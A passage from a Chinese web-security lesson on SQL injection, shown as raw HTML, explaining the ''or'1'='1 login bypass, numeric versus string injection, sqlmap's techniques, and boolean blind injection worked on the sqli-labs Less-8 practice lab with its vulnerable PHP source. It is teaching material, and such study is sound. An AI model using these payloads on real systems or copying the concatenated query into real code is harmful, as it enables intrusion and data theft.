style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> username</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;&#39;</span><span style="color:#F97583;">or</span><span style="color:#9ECBFF;">&#39;1&#39;</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;1&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">and</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">password=</span><span style="color:#9ECBFF;">&#39;&#39;</span><span style="color:#F97583;">or</span><span style="color:#9ECBFF;">&#39;1&#39;</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;1&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">LIMIT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">1</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> username, </span><span style="color:#D73A49;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> username</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;&#39;</span><span style="color:#D73A49;">or</span><span style="color:#032F62;">&#39;1&#39;</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;1&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">and</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">password=</span><span style="color:#032F62;">&#39;&#39;</span><span style="color:#D73A49;">or</span><span style="color:#032F62;">&#39;1&#39;</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;1&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">LIMIT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">1</span></span></code></pre></div><p>可以发现 username 和 password 为空或者 &#39;1&#39;=&#39;1&#39;，而&#39;1&#39;=&#39;\`&#39;永远为真，SQL 语句必然成立。只要能查询到有效数据就可以登录，或者后面随便回句永远为真的语句就能够绕过验证登录，这就是万能密码存在的原因。</p><p>相信看到这里，你对 SQL 注入产生的原因应该有所理解了。简单来讲，就是开发时未对用户的输入数据（可能是 GET 或 POST 参数，也可能是 Cookie、HTTP 头等）进行有效过滤，直接带入 SQL 语句解析，使得原本应为参数数据的内容，却被用来拼接 SQL 语句做解析，也就是说，<strong>将数据当代码解析，最终导致 SQL 注入漏洞的产生</strong>。</p><p>关于此类漏洞的防御我会在《09 | CSRF 漏洞：谁改了我的密码？》中介绍。</p><h3 id="sql-注入的分类" tabindex="-1">SQL 注入的分类 <a class="header-anchor" href="#sql-注入的分类" aria-label="Permalink to &quot;SQL 注入的分类&quot;">​</a></h3><p>我们接着来了解 SQL 注入的分类。根据注入点（比如漏洞参数）的数据类型不同，SQL 注入可以分为两类：数字/整数型注入和字符型注入。</p><h4 id="数字-整数型注入" tabindex="-1">数字/整数型注入 <a class="header-anchor" href="#数字-整数型注入" aria-label="Permalink to &quot;数字/整数型注入&quot;">​</a></h4><p>注入的参数为整数时就是数字型注入，或者叫整数型注入。其 SQL 语句原型类似：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">table</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> id</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">1</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">*</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">table</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> id</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">1</span></span></code></pre></div><p>此处 id 参数为整数，两边无引号。测试时可以使用 1+1 和 3-1 这种计算结果相同的参数值去构造请示，对比响应结果是否一致，如果相同就可能在数字型注入。</p><h4 id="字符型注入" tabindex="-1">字符型注入 <a class="header-anchor" href="#字符型注入" aria-label="Permalink to &quot;字符型注入&quot;">​</a></h4><p>注入参数为字符串时就是字符型注入，其 SQL 语句原型类似：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">table</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">name=</span><span style="color:#9ECBFF;">&#39;test&#39;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">*</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">table</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">name=</span><span style="color:#032F62;">&#39;test&#39;</span></span></code></pre></div><p>此处的 name 为字符串参数，两边包含引号。</p><p>其他资料也有给出第 3 种分类：<strong>搜索型注入</strong>，但我认为它本质上属于字符型注入，只是相对特殊一点，存在于搜索语句中。此类注入常常以 % 为关键字来闭合 SQL 语句。</p><p>区分数字型与字符型注入的最简单办法就是看<strong>是否存在引号</strong>。在有源码的情况下很好判断，若无源码，可以尝试输入单引号看是否报错，同时也可以直接根据输入参数的类型做初步判断。</p><p>了解了 SQL 注入的分类后，就可以针对不同的注入类型采取不同的注入测试技术。</p><h3 id="sql-注入测试技术" tabindex="-1">SQL 注入测试技术 <a class="header-anchor" href="#sql-注入测试技术" aria-label="Permalink to &quot;SQL 注入测试技术&quot;">​</a></h3><p>我认为当前 SQL 注入利用工具中，sqlmap 无疑是王者。它涵盖了 SQL 注入检测、利用、防御绕过、扩展、getshell 等多种功能，功能全面且工程化，是学习研究 SQL 注入绕不开的工具。</p><p>如果你查看 sqlmap 的命令帮助信息，可以发现它使用的 SQL 注入技术共有以下 6 种，默认全开，对应的参数值为&quot;BEUSTQ&quot;，如下所示：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">  Techniques</span><span style="color:#F97583;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    These options can be used to tweak testing of specific SQL injection</span></span>
<span class="line"><span style="color:#E1E4E8;">    techniques</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">--</span><span style="color:#E1E4E8;">technique</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">TECH..  SQL injection techniques to </span><span style="color:#B392F0;">use</span><span style="color:#E1E4E8;"> (</span><span style="color:#F97583;">default</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;BEUSTQ&quot;</span><span style="color:#E1E4E8;">)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">  Techniques</span><span style="color:#D73A49;">:</span></span>
<span class="line"><span style="color:#24292E;">    These options can be used to tweak testing of specific SQL injection</span></span>
<span class="line"><span style="color:#24292E;">    techniques</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">--</span><span style="color:#24292E;">technique</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">TECH..  SQL injection techniques to </span><span style="color:#6F42C1;">use</span><span style="color:#24292E;"> (</span><span style="color:#D73A49;">default</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;BEUSTQ&quot;</span><span style="color:#24292E;">)</span></span></code></pre></div><p>BEUSTQ 的参数含义如下：</p><ul><li><p>B，Boolean-based blind（布尔型盲注）；</p></li><li><p>E，Error-based（报错型注入）；</p></li><li><p>U，Union query-based（联合查询注入）；</p></li><li><p>S，Stacked queries（多语句堆叠注入）；</p></li><li><p>T，Time-based blind（基于时间延迟盲注）；</p></li><li><p>Q，Inline queries（内联/嵌套查询注入）。</p></li></ul><p>下面我就重点来讲解这 6 大 SQL 注入技术。</p><h4 id="布尔型盲注" tabindex="-1">布尔型盲注 <a class="header-anchor" href="#布尔型盲注" aria-label="Permalink to &quot;布尔型盲注&quot;">​</a></h4><p>布尔（Boolean）就是真假两种结果，比如&quot;1=1&quot;为真，&quot;1=2&quot;为假。</p><p>前面列举的 SQL 注入是存在错误显示的，很容易判断 SQL 语句被注入后出错。但是，很多时间并没有错误回显，这时就只能&quot;盲注&quot;。我们可以通过对比真假请求的响应内容来判断是否存在 SQL 注入，这就是布尔型盲注。比如，对比注入参数与&quot;and 1=2&quot;的返回结果，如果两者不同则代表可能存在 SQL 注入。</p><p>除了布尔型盲注外，我们还可以采用时间延迟的方式来盲注，我在后面会讲到。</p>`,31),u=n("p",null,"图 4：正常访问的页面",-1),d=n("p",null,[s("以 sqli-labs 第 8 题为例，上图是正常访问后的网页内容。通过 Get 参数 id 实现 SQL 注入，我们直接用前面讲的单引号注入试试，请求地址为 "),n("a",{href:"http://localhost/Less-8/?id=1",target:"_blank",rel:"noreferrer"},"http://localhost/Less-8/?id=1"),s("'，返回结果如下：")],-1),h=p(`<p>图 5：单引号注入的返回结果</p><p>没有任何错误提示，显示此方法行不通。</p><p>下面我们试试布尔型盲注的方法，分别构造以下两个请示，然后对比二者的差异：</p><ul><li><p><a href="http://localhost/Less-8/?id=1&#39;and+1=1" target="_blank" rel="noreferrer">http://localhost/Less-8/?id=1&#39;and+1=1</a></p></li><li><p><a href="http://localhost/Less-8/?id=1&#39;and+1=2" target="_blank" rel="noreferrer">http://localhost/Less-8/?id=1&#39;and+1=2</a></p></li></ul><p>其中的 + 号代表空格，执行上述请求后，你会发现返回的页面没有任何变化。难道真没有 SQL 注入吗？</p><p>我们来看一下源码：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">//including the Mysql connect parameters.</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">include</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;../sql-connections/sql-connect.php&quot;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#79B8FF;">error_reporting</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">// take the variables</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">($_GET[</span><span style="color:#9ECBFF;">&#39;id&#39;</span><span style="color:#E1E4E8;">]))</span></span>
<span class="line"><span style="color:#E1E4E8;">	{</span></span>
<span class="line"><span style="color:#E1E4E8;">	  $id</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$_GET[</span><span style="color:#9ECBFF;">&#39;id&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">	  </span><span style="color:#6A737D;">//logging the connection parameters to a file for analysis.</span></span>
<span class="line"><span style="color:#E1E4E8;">	  $fp</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">fopen</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;result.txt&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	  </span><span style="color:#79B8FF;">fwrite</span><span style="color:#E1E4E8;">($fp,</span><span style="color:#9ECBFF;">&#39;ID:&#39;</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$id</span><span style="color:#F97583;">.</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">\\n</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	  </span><span style="color:#79B8FF;">fclose</span><span style="color:#E1E4E8;">($fp);</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">	  </span><span style="color:#6A737D;">// connectivity </span></span>
<span class="line"><span style="color:#E1E4E8;">	  $sql</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#F97583;">SELECT</span><span style="color:#9ECBFF;"> </span><span style="color:#F97583;">*</span><span style="color:#9ECBFF;"> </span><span style="color:#F97583;">FROM</span><span style="color:#9ECBFF;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#9ECBFF;"> id</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;</span><span style="color:#E1E4E8;">$id</span><span style="color:#9ECBFF;">&#39; </span><span style="color:#F97583;">LIMIT</span><span style="color:#9ECBFF;"> </span><span style="color:#79B8FF;">0</span><span style="color:#9ECBFF;">,</span><span style="color:#79B8FF;">1</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	  $result</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">mysql_query</span><span style="color:#E1E4E8;">($sql);</span></span>
<span class="line"><span style="color:#E1E4E8;">	   $row </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">mysql_fetch_array</span><span style="color:#E1E4E8;">($result);</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">	  </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">($row)</span></span>
<span class="line"><span style="color:#E1E4E8;">	   {</span></span>
<span class="line"><span style="color:#E1E4E8;">          </span><span style="color:#6A737D;">// 成功</span></span>
<span class="line"><span style="color:#E1E4E8;">	  	  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;</span><span style="color:#E1E4E8;">;	</span></span>
<span class="line"><span style="color:#E1E4E8;">	  	  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;You are in...........&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	  	  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	      </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;/font&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	    }</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> </span></span>
<span class="line"><span style="color:#E1E4E8;">		{</span></span>
<span class="line"><span style="color:#E1E4E8;">          </span><span style="color:#6A737D;">// 失败，关闭错误回显</span></span>
<span class="line"><span style="color:#E1E4E8;">  		  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">  		  </span><span style="color:#6A737D;">//echo &#39;You are in...........&#39;;</span></span>
<span class="line"><span style="color:#E1E4E8;">  		  </span><span style="color:#6A737D;">//print_r(mysql_error());</span></span>
<span class="line"><span style="color:#E1E4E8;">  		  </span><span style="color:#6A737D;">//echo &quot;You have an error in your SQL syntax&quot;;</span></span>
<span class="line"><span style="color:#E1E4E8;">  		  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span><span style="color:#E1E4E8;">;	</span></span>
<span class="line"><span style="color:#E1E4E8;">  		  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;</span><span style="color:#E1E4E8;">;	</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span></span>
<span class="line"><span style="color:#E1E4E8;">		}</span></span>
<span class="line"><span style="color:#E1E4E8;">	}</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> { </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;Please input the ID as parameter with numeric value&quot;</span><span style="color:#E1E4E8;">;}</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">//including the Mysql connect parameters.</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">include</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;../sql-connections/sql-connect.php&quot;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#005CC5;">error_reporting</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">// take the variables</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">($_GET[</span><span style="color:#032F62;">&#39;id&#39;</span><span style="color:#24292E;">]))</span></span>
<span class="line"><span style="color:#24292E;">	{</span></span>
<span class="line"><span style="color:#24292E;">	  $id</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$_GET[</span><span style="color:#032F62;">&#39;id&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">	  </span><span style="color:#6A737D;">//logging the connection parameters to a file for analysis.</span></span>
<span class="line"><span style="color:#24292E;">	  $fp</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">fopen</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;result.txt&#39;</span><span style="color:#24292E;">,</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	  </span><span style="color:#005CC5;">fwrite</span><span style="color:#24292E;">($fp,</span><span style="color:#032F62;">&#39;ID:&#39;</span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$id</span><span style="color:#D73A49;">.</span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">\\n</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	  </span><span style="color:#005CC5;">fclose</span><span style="color:#24292E;">($fp);</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">	  </span><span style="color:#6A737D;">// connectivity </span></span>
<span class="line"><span style="color:#24292E;">	  $sql</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;</span><span style="color:#D73A49;">SELECT</span><span style="color:#032F62;"> </span><span style="color:#D73A49;">*</span><span style="color:#032F62;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#032F62;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#032F62;"> id</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;</span><span style="color:#24292E;">$id</span><span style="color:#032F62;">&#39; </span><span style="color:#D73A49;">LIMIT</span><span style="color:#032F62;"> </span><span style="color:#005CC5;">0</span><span style="color:#032F62;">,</span><span style="color:#005CC5;">1</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	  $result</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">mysql_query</span><span style="color:#24292E;">($sql);</span></span>
<span class="line"><span style="color:#24292E;">	   $row </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">mysql_fetch_array</span><span style="color:#24292E;">($result);</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">	  </span><span style="color:#D73A49;">if</span><span style="color:#24292E;">($row)</span></span>
<span class="line"><span style="color:#24292E;">	   {</span></span>
<span class="line"><span style="color:#24292E;">          </span><span style="color:#6A737D;">// 成功</span></span>
<span class="line"><span style="color:#24292E;">	  	  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;</span><span style="color:#24292E;">;	</span></span>
<span class="line"><span style="color:#24292E;">	  	  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;You are in...........&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	  	  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;br&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	      </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;/font&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	    }</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> </span></span>
<span class="line"><span style="color:#24292E;">		{</span></span>
<span class="line"><span style="color:#24292E;">          </span><span style="color:#6A737D;">// 失败，关闭错误回显</span></span>
<span class="line"><span style="color:#24292E;">  		  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">  		  </span><span style="color:#6A737D;">//echo &#39;You are in...........&#39;;</span></span>
<span class="line"><span style="color:#24292E;">  		  </span><span style="color:#6A737D;">//print_r(mysql_error());</span></span>
<span class="line"><span style="color:#24292E;">  		  </span><span style="color:#6A737D;">//echo &quot;You have an error in your SQL syntax&quot;;</span></span>
<span class="line"><span style="color:#24292E;">  		  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span><span style="color:#24292E;">;	</span></span>
<span class="line"><span style="color:#24292E;">  		  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;</span><span style="color:#24292E;">;	</span></span>
<span class="line"><span style="color:#24292E;">		</span></span>
<span class="line"><span style="color:#24292E;">		}</span></span>
<span class="line"><span style="color:#24292E;">	}</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> { </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;Please input the ID as parameter with numeric value&quot;</span><span style="color:#24292E;">;}</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>重点就在这句 SQL 语句上：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> id</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;$id&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">LIMIT</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">1</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">*</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> id</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;$id&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">LIMIT</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">0</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">1</span></span></code></pre></div><p>注意这里有单引号，所以是字符型注入，我们将前面的测试语句代入：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> id</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;1&#39;</span><span style="color:#F97583;">and</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">1</span><span style="color:#9ECBFF;">&#39; LIMIT 0,1</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">*</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> id</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;1&#39;</span><span style="color:#D73A49;">and</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">1</span><span style="color:#032F62;">&#39; LIMIT 0,1</span></span></code></pre></div><p>此处单引号未得到闭合，导致了语法错误，这正是前面测试方法失败的原因。我们可以考虑用--注释掉。<strong>在 URL 请求里要注意在后面加 +，+ 在 URL 中相当于空格，加了 + 才能有效注释</strong>。最后我们得到构造语句：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">FROM</span><span style="color:#E1E4E8;"> users </span><span style="color:#F97583;">WHERE</span><span style="color:#E1E4E8;"> id</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;1&#39;</span><span style="color:#F97583;">and</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#6A737D;">-- &#39; LIMIT 0,1</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">*</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> users </span><span style="color:#D73A49;">WHERE</span><span style="color:#24292E;"> id</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;1&#39;</span><span style="color:#D73A49;">and</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">1</span><span style="color:#24292E;"> </span><span style="color:#6A737D;">-- &#39; LIMIT 0,1</span></span></code></pre></div><p>为了方便验证 SQL 语句，推荐你直接进入 Docker 容器的 MySQL 进行测试：</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">sudo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">docker</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">ps</span></span>
